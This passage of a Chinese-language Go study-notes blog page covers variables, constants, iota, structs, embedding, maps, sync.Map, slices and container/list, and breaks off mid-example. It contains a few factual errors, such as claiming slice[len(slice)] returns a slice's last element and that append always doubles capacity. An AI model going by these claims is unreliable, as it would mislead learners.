title="变量"></a>变量</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 变量如果只声明没有赋值，则默认值为0，bool型是false，字符型是""</span><br><span class="line">2. =:  (1)不能在函数体外面复制，这样会报错。(2)=:声明的变量不能用var声明，而且这个变量是没有被声明过的</span><br><span class="line">3. 变量被声明了之后必须被使用，不然就会报错</span><br><span class="line">4. 下划线也被称为空白标识符，例如：var _ , a=1,2中的1会被抛弃，空白标识符经常在函数返回值中使用</span><br><span class="line">5. 同时声明多个变量，var a,b,c=1,2,3 //其中不用标明变量类型，这一点和python很像</span><br><span class="line">6. 交换两个变量的值时候要注意类型要相同，a,b=b,a</span><br><span class="line">7. 变量还可以使用枚举的方式声明var(</span><br><span class="line">                            name="qiyou"</span><br><span class="line">                            age=10</span><br><span class="line">                            )</span><br></pre></td></tr></tbody></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</span><br><span class="line">2. 声明格式：const identifier [type] = value //你可以省略类型说明符 [type]，因为编译器可以根据变量的值来推断其类型。</span><br><span class="line">3. 常量声明之后不使用也可以</span><br><span class="line">4. 常量还可以使用枚举的方式声明const(</span><br><span class="line">                            NAME="qiyou"</span><br><span class="line">                            AGE=10</span><br><span class="line">                            )</span><br><span class="line">5. 同时声明多个常量：const NAME,AGE="QIYOU",1</span><br><span class="line">6. 在定义常量组时，如果不提供初始值，则表示将使用上行的表达式（只适用于枚举的情况下）。</span><br><span class="line">const(</span><br><span class="line">a=1</span><br><span class="line">b</span><br><span class="line">)</span><br><span class="line">fmt.Println(a,b) //输出1 1</span><br></pre></td></tr></tbody></table></figure><p>iota<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">const(</span><br><span class="line">a=iota //a=0</span><br><span class="line">b//b=1</span><br><span class="line">c//c=2</span><br><span class="line">d//d=3</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">如果想忽略中间一个量则可以使用</span><br><span class="line">const(</span><br><span class="line">a=iota //a=0</span><br><span class="line">b//b=1</span><br><span class="line">c//c=2</span><br><span class="line">d//d=3</span><br><span class="line">_</span><br><span class="line">e//e=5</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">乘法实例</span><br><span class="line">const(</span><br><span class="line">a=2*iota //2*0</span><br><span class="line">b        //2*1</span><br><span class="line">c        //2*2</span><br><span class="line">d        //2*3</span><br><span class="line">e        //2*4</span><br><span class="line">f="test" //注意这里iota变成了5</span><br><span class="line">g=2*iota  //2*6</span><br><span class="line">)</span><br><span class="line">fmt.Println(a,b,c,d,e,g)</span><br><span class="line"></span><br><span class="line">iota 只是在同一个 const 常量组内递增，每当有新的 const 关键字时，iota 计数会重新开始。</span><br><span class="line">    const (</span><br><span class="line">        i = iota</span><br><span class="line">        j = iota</span><br><span class="line">        x = iota</span><br><span class="line">    )</span><br><span class="line">    const xx = iota</span><br><span class="line">    const yy = iota</span><br><span class="line">    func main(){</span><br><span class="line">        println(i, j, x, xx, yy)</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    // 输出是 0 1 2 0 0</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+相加A + B 输出结果 30</span><br><span class="line">-相减A - B 输出结果 -10</span><br><span class="line">*相乘A * B 输出结果 200</span><br><span class="line">/相除B / A 输出结果 2</span><br><span class="line">%求余B % A 输出结果 0</span><br><span class="line">++自增A++ 输出结果 11</span><br><span class="line">--自减A-- 输出结果 9</span><br><span class="line"></span><br><span class="line">&amp;&amp;逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。(A &amp;&amp; B) 为 False</span><br><span class="line">||逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。(A || B) 为 True</span><br><span class="line">!逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。!(A &amp;&amp; B) 为 True</span><br></pre></td></tr></tbody></table></figure><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>case<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 注意多个case是不能出现相同的值的，否则会报错</span><br><span class="line">2. 可以在一个 case 中包含多个表达式，每个表达式用逗号分隔。</span><br><span class="line">3. 没有表达式的 switch,则相当于 switch true，这种情况下会将每一个 case 的表达式的求值结果与 true 做比较，如果相等，则执行相应的代码。</span><br><span class="line">4. fallthrough语句用于标明执行完当前 case 语句之后按顺序执行下一个case 语句。</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 在必要以及可行的情况下，一个类型的值可以被转换成另一种类型的值。由于Go语言不存在隐式类型转换，因此所有的类型转换都必须显式的声明</span><br><span class="line"></span><br><span class="line">2. bool型不能转换位int型，相反int型也不能转换成bool型</span><br><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></tbody></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. new() 函数可以创建一个对应类型的指针，创建过程会分配内存，被创建的指针指向默认值。</span><br><span class="line"></span><br><span class="line">2. %p表示输出指针地址</span><br></pre></td></tr></tbody></table></figure><h3 id="Go语言type关键字（类型别名）"><a href="#Go语言type关键字（类型别名）" class="headerlink" title="Go语言type关键字（类型别名）"></a>Go语言type关键字（类型别名）</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type NewType = Type //定义别名</span><br><span class="line">type NewType Type //定义一个类型</span><br></pre></td></tr></tbody></table></figure><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><h4 id="实例化的方法"><a href="#实例化的方法" class="headerlink" title="实例化的方法"></a>实例化的方法</h4><ol><li><p>用var实例化</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 结构体本身也是一种类型，可以用var实例化：var name T</span><br></pre></td></tr></tbody></table></figure></li><li><p>创建指针类型的结构体</p></li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语法：ins := new(T)</span><br><span class="line"></span><br><span class="line">T 为类型，可以是结构体、整型、字符串等。</span><br><span class="line">ins：T 类型被实例化后保存到 ins 变量中，ins 的类型为 *T，属于指针。</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>取结构体的地址实例化<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Go语言中，对结构体进行&amp;取地址操作时，视为对该类型进行一次 new 的实例化操作，取地址格式为：ins := &amp;T{}</span><br><span class="line">带传值的：ins:=&amp;person{name: name,age: age,nickname: nickname}</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="成员赋值"><a href="#成员赋值" class="headerlink" title="成员赋值"></a>成员赋值</h4><ol><li><p>结构体实例化后字段的默认值是字段类型的默认值，例如 ，数值为 0、字符串为 “”（空字符串）、布尔为 false、指针为 nil 等。</p></li><li><p>使用多个值的列表初始化结构体</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">必须初始化结构体的所有字段。</span><br><span class="line">每一个初始值的填充顺序必须与字段在结构体中的声明顺序一致。</span><br><span class="line">键值对与值列表的初始化形式不能混用。</span><br><span class="line"></span><br><span class="line">type Address struct {</span><br><span class="line">    Province    string</span><br><span class="line">    City        string</span><br><span class="line">    ZipCode     int</span><br><span class="line">    PhoneNumber string</span><br><span class="line">}</span><br><span class="line">addr := Address{</span><br><span class="line">    "四川",</span><br><span class="line">    "成都",</span><br><span class="line">    610000,</span><br><span class="line">    "0",</span><br><span class="line">}</span><br><span class="line">fmt.Println(addr)</span><br></pre></td></tr></tbody></table></figure></li></ol><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指针结构体，成员可以直接使用.号访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span>{</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">age <span class="keyword">int</span></span><br><span class="line">weigth <span class="keyword">int</span></span><br><span class="line">nickname <span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line"><span class="keyword">var</span> lisi person</span><br><span class="line">lisi.name=<span class="string">"lisi"</span></span><br><span class="line">changename(&amp;lisi)</span><br><span class="line">fmt.Println(lisi.name)</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changename</span><span class="params">(pname *person)</span></span>{</span><br><span class="line">pname.name=<span class="string">"qiyou"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="接收器"><a href="#接收器" class="headerlink" title="接收器"></a>接收器</h4><p>接收器的格式如下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func (接收器变量 接收器类型) 方法名(参数列表) (返回参数) {</span><br><span class="line">    函数体</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>指针类型的接收器<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">type person struct{</span><br><span class="line">    name string</span><br><span class="line">    age uint</span><br><span class="line">    nickname string</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main(){</span><br><span class="line">    lisi:=&amp;person{}</span><br><span class="line">    lisi.setValue("lisi")</span><br><span class="line">    fmt.Println(lisi.getValue())</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func (p *person)setValue(v string){</span><br><span class="line">    p.name=v</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (p *person)getValue() string{</span><br><span class="line">    return p.name</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Go语言类型内嵌和结构体内嵌"><a href="#Go语言类型内嵌和结构体内嵌" class="headerlink" title="Go语言类型内嵌和结构体内嵌"></a>Go语言类型内嵌和结构体内嵌</h4><ol><li>在一个结构体中对于每一种数据类型只能有一个匿名字段。</li><li><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">func main()  {</span><br><span class="line">    type inn struct{</span><br><span class="line">        name string</span><br><span class="line">    }</span><br><span class="line">    type test struct{</span><br><span class="line">        nickname string</span><br><span class="line">        name string</span><br><span class="line">        int</span><br><span class="line">        inn</span><br><span class="line">    }</span><br><span class="line">    abc:=&amp;test{}</span><br><span class="line">    abc.nickname="zhangsan"</span><br><span class="line">    abc.inn.name="lisi" //另外一种访问方式：abc.name="lisi"，前提test这个结构体没有name这个成员</span><br><span class="line">    abc.int=1           //直接使用abc.int访问匿名变量，不过每一种类型的匿名变量只能有一个</span><br><span class="line">    fmt.Println(abc.inn.name) //也可以abc.name，前提test这个结构体没有name这个成员</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="结构体内嵌模拟类的继承"><a href="#结构体内嵌模拟类的继承" class="headerlink" title="结构体内嵌模拟类的继承"></a>结构体内嵌模拟类的继承</h4><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">type Walkable struct{}</span><br><span class="line">type Fly struct{}</span><br><span class="line"></span><br><span class="line">func (f *Fly) IsFly(){</span><br><span class="line">    fmt.Println("I can fly!")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (w * Walkable)IsWalk(){</span><br><span class="line">    fmt.Println("I can Walk!")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">type bird struct{</span><br><span class="line">    Walkable</span><br><span class="line">    Fly</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">type human struct{</span><br><span class="line">    Walkable</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func main()  {</span><br><span class="line">    b:=new(bird)</span><br><span class="line">    b.IsFly() //或者 b.Fly.IsFly()</span><br><span class="line">    b.IsWalk() //或者 b.Walkable.IsWalk()</span><br><span class="line">    h:=new(human)</span><br><span class="line">    h.IsWalk()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="初始化内嵌结构体"><a href="#初始化内嵌结构体" class="headerlink" title="初始化内嵌结构体"></a>初始化内嵌结构体</h4><p>例子一：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">type computer struct{</span><br><span class="line">    cpu string</span><br><span class="line">    RAM uint</span><br><span class="line">    ROM uint</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main()  {</span><br><span class="line">    lianxiang:=computer{</span><br><span class="line">        cpu:"Intel",</span><br><span class="line">        RAM:8,</span><br><span class="line">        ROM:1000, //注意最后要有逗号，不然就会报错</span><br><span class="line">    }</span><br><span class="line">    fmt.Println(lianxiang)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>例子二：<br>有时考虑编写代码的便利性，会将结构体直接定义在嵌入的结构体中。也就是说，结构体的定义不会被外部引用到。在初始化这个被嵌入的结构体时，就需要再次声明结构才能赋予数据。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">type computer struct{</span><br><span class="line">    cpu string</span><br><span class="line">    RAM uint</span><br><span class="line">    ROM struct{</span><br><span class="line">        size uint</span><br><span class="line">        brand string</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main()  {</span><br><span class="line">    lianxiang:=computer{</span><br><span class="line">        cpu: "Intel",</span><br><span class="line">        RAM: 8,</span><br><span class="line">        ROM: struct{</span><br><span class="line">            size uint</span><br><span class="line">            brand string</span><br><span class="line">        }{</span><br><span class="line">            size: 1000,</span><br><span class="line">            brand: "Kingston",</span><br><span class="line">        },  //注意这里要有逗号，不然就会报错</span><br><span class="line">    }</span><br><span class="line">    fmt.Println(lianxiang)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* 声明变量，默认 map 是 nil */</span><br><span class="line">var map_variable map[key_data_type]value_data_type</span><br><span class="line"></span><br><span class="line">/* 使用 make 函数 */</span><br><span class="line">map_variable := make(map[key_data_type]value_data_type)</span><br><span class="line"></span><br><span class="line">声明：  var person map[string]string    //map为nil，可以通过这种形式来添加键值对：person = map[string]string{"name":"qiyou"}</span><br><span class="line">        var person =map[string]string{} //注意后面有一个{}，map不是nil</span><br><span class="line">        var person = make(map[string]string)</span><br><span class="line"></span><br><span class="line">如果不初始化 map，那么就会创建一个 nil map。nil map 不能用来存放键值对</span><br><span class="line"></span><br><span class="line">2. delete函数用于删除一个集合中的元素：</span><br><span class="line">                                      delete(person,"name")</span><br><span class="line"></span><br><span class="line">3. 一个可以对应多个值我们可以用切片来解决：</span><br><span class="line">                                    m1:=make(map[string][]int)</span><br><span class="line">                                        m1["name"]=[]int {1,1,2,1}</span><br><span class="line">                                        fmt.Println(m1["name"])</span><br><span class="line">4. map的遍历我们可以用for range</span><br><span class="line"></span><br><span class="line">5. go没有提供清空map的函数，所以清空map的方法是重新make一个map</span><br></pre></td></tr></tbody></table></figure><h3 id="sync-Map"><a href="#sync-Map" class="headerlink" title="sync.Map"></a>sync.Map</h3><blockquote><p>Go中的 map 在并发情况下，只读是线程安全的，同时读写是线程不安全的。所以就有了sync.Map</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sync.Map 和 map 不同，不是以语言原生形态提供，而是在 sync 包下的特殊结构。</span><br><span class="line">2. sync.Map 有以下特性：</span><br><span class="line">        无须初始化，直接声明即可。</span><br><span class="line">        sync.Map 不能使用 map 的方式进行取值和设置等操作，而是使用 sync.Map 的方法进行调用，Store 表示存储，Load表示获取，Delete 表示删除。</span><br><span class="line">        使用 Range 配合一个回调函数进行遍历操作，通过回调函数返回内部遍历出来的值，Range参数中回调函数的返回值在需要继续迭代遍历时，返回 true；终止迭代遍历时，返回 false。</span><br><span class="line">3. sync.Map的键类型和值类型不一定必须相同</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">      "fmt"</span><br><span class="line">      "sync"</span><br><span class="line">)</span><br><span class="line">func main() {</span><br><span class="line">    var scene sync.Map</span><br><span class="line">    // 将键值对保存到sync.Map</span><br><span class="line">    scene.Store("greece", 97)</span><br><span class="line">    scene.Store("london", 100)</span><br><span class="line">    scene.Store("egypt", 200)</span><br><span class="line">    // 从sync.Map中根据键取值</span><br><span class="line">    fmt.Println(scene.Load("london"))</span><br><span class="line">    // 根据键删除对应的键值对</span><br><span class="line">    scene.Delete("london")</span><br><span class="line">    // 遍历所有sync.Map中的键值对</span><br><span class="line">    scene.Range(func(k, v interface{}) bool {</span><br><span class="line">        fmt.Println("iterate:", k, v)</span><br><span class="line">        return true</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>如果忽略 [] 中的数字不设置数组大小，Go 语言会根据元素的个数来设置数组的大小：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:=[...]int {1,1,1,1} //最终长度为4</span><br></pre></td></tr></tbody></table></figure><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><blockquote><p>切片并不存储任何元素而只是对现有数组的引用。</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">从数组或切片生成新的切片拥有如下特性：</span><br><span class="line">取出的元素数量为：结束位置 - 开始位置；</span><br><span class="line">取出元素不包含结束位置对应的索引，切片最后一个元素使用 slice[len(slice)] 获取；</span><br><span class="line">当缺省开始位置时，表示从连续区域开头到结束位置；</span><br><span class="line">当缺省结束位置时，表示从开始位置到整个连续区域末尾；</span><br><span class="line">两者同时缺省时，与切片本身等效；//a[:]</span><br><span class="line">两者同时为 0 时，等效于空切片，一般用于切片复位。 //a[0:0]</span><br><span class="line"></span><br><span class="line">切片和数组的区别就是：切片是引用，而数组是值传递</span><br><span class="line"></span><br><span class="line">切片的长度和容量：</span><br><span class="line">    切片的长度是指切片中元素的个数。切片的容量是指从切片的起始元素开始到其底层数组中的最后一个元素的个数。</span><br></pre></td></tr></tbody></table></figure><p>append<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">append只能用于操作切片，不能用于操作数组</span><br><span class="line">当新元素通过调用 append 函数追加到切片末尾时，如果超出了容量，append 内部会创建一个新的数组。并将原有数组的元素被拷贝给这个新的数组，最后返回建立在这个新数组上的切片。这个新切片的容量是旧切片的二倍</span><br><span class="line">append的返回值是添加后的切片</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a= []<span class="keyword">int</span>{<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>}</span><br><span class="line"><span class="keyword">var</span> b =a[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> x,_:=<span class="keyword">range</span> b{</span><br><span class="line">b[x]++</span><br><span class="line">}</span><br><span class="line">fmt.Println(a)</span><br><span class="line"><span class="comment">//注意切片是对数组的引用，而不是传递值，所有a输出的是[1 3 3]</span></span><br></pre></td></tr></tbody></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><blockquote><p>不是go内置的，要导入包container/list</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. list 的初始化有两种方法：分别是使用 New() 函数和 var 关键字声明，两种方法的初始化效果都是一致的。</span><br><span class="line">    1) 通过 container/list 包的 New() 函数初始化 list</span><br><span class="line">        变量名 := list.New()</span><br><span class="line"></span><br><span class="line">    2) 通过 var 关键字声明初始化 list</span><br><span class="line">        var 变量名 list.List</span><br></pre></td></tr></tbody></table></figure><p>函数<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. mylist.Len() 返回链表的长度</span><br><span class="line">2. mylist.init() 初始化链表，即清空链表</span><br><span class="line">3. PushBack在列表mylist的后面插入一个值为v的新元素e并返回e。</span><br><span class="line">4. PushFront在列表mylist的前面插入一个值为v的新元素e并返回e。</span><br><span class="line">5. Next返回下一个list元素或nil</span><br></pre></td></tr></tbody></table></figure><p></p><p>例子<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">l := list.New()</span><br><span class="line"> <span class="comment">// 尾部添加</span></span><br><span class="line"> l.PushBack(<span class="string">"canon"</span>)</span><br><span class="line"> <span class="comment">// 头部添加</span></span><br><span class="line"> l.PushFront(<span class="number">67</span>)</span><br><span class="line"> <span class="comment">// 尾部添加后保存元素句柄</span></span><br><span class="line"> element := l.PushBack(<span class="string">"fist"</span>)</span><br><span class="line"> <span class="comment">// 在fist之后添加high</span></span><br><span class="line"> l.InsertAfter(<span class="string">"high"</span>, element) </span><br><span class="line"> <span class="comment">// 在fist之前添加noon</span></span><br><span class="line"> l.InsertBefore(<span 